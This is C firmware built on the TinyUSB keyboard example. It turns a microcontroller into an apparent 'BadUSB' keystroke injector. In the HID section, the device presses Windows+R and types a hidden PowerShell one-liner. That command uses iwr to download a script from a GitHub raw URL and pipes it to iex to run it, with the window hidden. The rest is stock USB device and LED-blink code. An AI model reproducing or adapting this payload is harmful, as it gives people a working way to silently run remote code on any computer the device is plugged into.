/* 
 * The MIT License (MIT)
 *
 * Copyright (c) 2019 Ha Thach (tinyusb.org)
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "bsp/board.h"
#include "tusb.h"

#include "usb_descriptors.h"

//--------------------------------------------------------------------+
// MACRO CONSTANT TYPEDEF PROTYPES
//--------------------------------------------------------------------+

/* Blink pattern
 * - 250 ms  : device not mounted
 * - 1000 ms : device mounted
 * - 2500 ms : device is suspended
 */
enum  {
  BLINK_NOT_MOUNTED = 250,
  BLINK_MOUNTED = 1000,
  BLINK_SUSPENDED = 2500,
};


static uint32_t blink_interval_ms = BLINK_NOT_MOUNTED;

void led_blinking_task(void);
void hid_task(void);

static bool capslock = false;

/*------------- MAIN -------------*/
int main(void)
{
  board_init();
  tusb_init();

  while (1)
  {
    tud_task(); // tinyusb device task
    led_blinking_task();

    hid_task();
  }
}

//--------------------------------------------------------------------+
// Device callbacks
//--------------------------------------------------------------------+

// Invoked when device is mounted
void tud_mount_cb(void)
{
  blink_interval_ms = BLINK_MOUNTED;
}

// Invoked when device is unmounted
void tud_umount_cb(void)
{
  blink_interval_ms = BLINK_NOT_MOUNTED;
}

// Invoked when usb bus is suspended
// remote_wakeup_en : if host allow us  to perform remote wakeup
// Within 7ms, device must draw an average of current less than 2.5 mA from bus
void tud_suspend_cb(bool remote_wakeup_en)
{
  (void) remote_wakeup_en;
  blink_interval_ms = BLINK_SUSPENDED;
}

// Invoked when usb bus is resumed
void tud_resume_cb(void)
{
  blink_interval_ms = BLINK_MOUNTED;
}

//--------------------------------------------------------------------+
// USB HID
//--------------------------------------------------------------------+
const char* inputs = "~r~powershel~l -w h iwr 'ht~tps:/~/raw.githubusercontent.com/map32/cybersecurity-badusb/main/hey2.ps1' | iex\n";
const int inputs_len = 110;
uint8_t char_to_hid_code (uint8_t c) {
  if (c >= 'A' && c <= 'Z') return c - 'A' + HID_KEY_A;
  else if (c >= 'a' && c <= 'z') return c - 'a' + HID_KEY_A;
  else if (c >= '1' && c <= '9') return c - '1' + HID_KEY_1;
  else if (c == '0') return HID_KEY_0;
  else if (c == '\n' || c == '\r') return HID_KEY_ENTER;
  else if (c == ' ') return HID_KEY_SPACE;
  else if (c == '/') return HID_KEY_SLASH;
  else if (c == '\\' || c == '|') return HID_KEY_BACKSLASH;
  else if (c == '-') return HID_KEY_MINUS;
  else if (c == '.') return HID_KEY_PERIOD;
  else if (c == '$') return HID_KEY_4;
  else if (c == '\"' || c == '\'') return HID_KEY_APOSTROPHE;
  else if (c == '&') return HID_KEY_7;
  else if (c == '^') return HID_KEY_6;
  else if (c == '>') return HID_KEY_PERIOD;
  else if (c == ':') return HID_KEY_SEMICOLON;
  else if (c == '(') return HID_KEY_9;
  else if (c == ')') return HID_KEY_0;
  return HID_KEY_NONE; //error check
}
uint32_t interval_ms = 10;
static void send_hid_report()
{

  static bool first = true;
  static int counter = 0;
  // skip if hid is not ready yet
  if ( !tud_hid_ready() ) return;

    uint8_t keycode[6] = { 0 };
    uint8_t modifier_bits = 0;
    if (first) {
      first = false;
      interval_ms = 700;
    } else if (counter == 1) {
      modifier_bits = 1 << 3; //Left Windows key
      interval_ms = 700;
    }
    if (counter < inputs_len){
      keycode[0] = char_to_hid_code(inputs[counter]);
      if (inputs[counter] == '\r'){
        interval_ms = 250;
      } else if (inputs[counter] == '~') {
        interval_ms = 10;
      }
      if (inputs[counter] == '$' || inputs[counter] == '^' || inputs[counter] == '&' ||inputs[counter] == '>' || inputs[counter] == ':' || inputs[counter] == '(' || inputs[counter] == ')' || inputs[counter] == '\"' || inputs[counter] == '|') modifier_bits = 1 << 1;
    }
    tud_hid_keyboard_report(0, modifier_bits, keycode);
    
    counter++;
}

// Every 10ms, we will sent 1 report for each HID profile (keyboard, mouse etc ..)
// tud_hid_report_complete_cb() is used to send the next report after previous one is complete
void hid_task(void)
{
  static uint32_t start_ms = 0;

  if ( board_millis() - start_ms < interval_ms) return; // not enough time
  start_ms += interval_ms;
  if (tud_suspended()) {
    tud_remote_wakeup();
  } else {
  // Send the 1st of report chain, the rest will be sent by tud_hid_report_complete_cb()
    send_hid_report();
  }
}

// Invoked when sent REPORT successfully to host
// Application can use this to send the next report
// Note: For composite reports, report[0] is report ID
void tud_hid_report_complete_cb(uint8_t instance, uint8_t const* report, uint16_t len)
{
}

// Invoked when received GET_REPORT control request
// Application must fill buffer report's content and return its length.
// Return zero will cause the stack to STALL request
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t* buffer, uint16_t reqlen)
{
  // TODO not Implemented
  (void) instance;
  (void) report_id;
  (void) report_type;
  (void) buffer;
  (void) reqlen;

  return 0;
}

// Invoked when received SET_REPORT control request or
// received data on OUT endpoint ( Report ID = 0, Type = 0 )
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize)
{
  (void) instance;

  if (report_type == HID_REPORT_TYPE_OUTPUT)
  {
      // bufsize should be (at least) 1
      if ( bufsize < 1 ) return;

      uint8_t const kbd_leds = buffer[0];

      if (kbd_leds & KEYBOARD_LED_CAPSLOCK)
      {
        // Capslock On: disable blink, turn led on
        blink_interval_ms = 0;
        board_led_write(true);
        capslock=true;
      }else
      {
        // Caplocks Off: back to normal blink
        capslock=false;
        board_led_write(false);
        blink_interval_ms = BLINK_MOUNTED;
      }
  }
}

//--------------------------------------------------------------------+
// BLINKING TASK
//--------------------------------------------------------------------+
void led_blinking_task(void)
{
  static uint32_t start_ms = 0;
  static bool led_state = false;

  // blink is disabled
  if (!blink_interval_ms) return;

  // Blink every interval ms
  if ( board_millis() - start_ms < blink_interval_ms) return; // not enough time
  start_ms += blink_interval_ms;

  board_led_write(led_state);
  led_state = 1 - led_state; // toggle
}
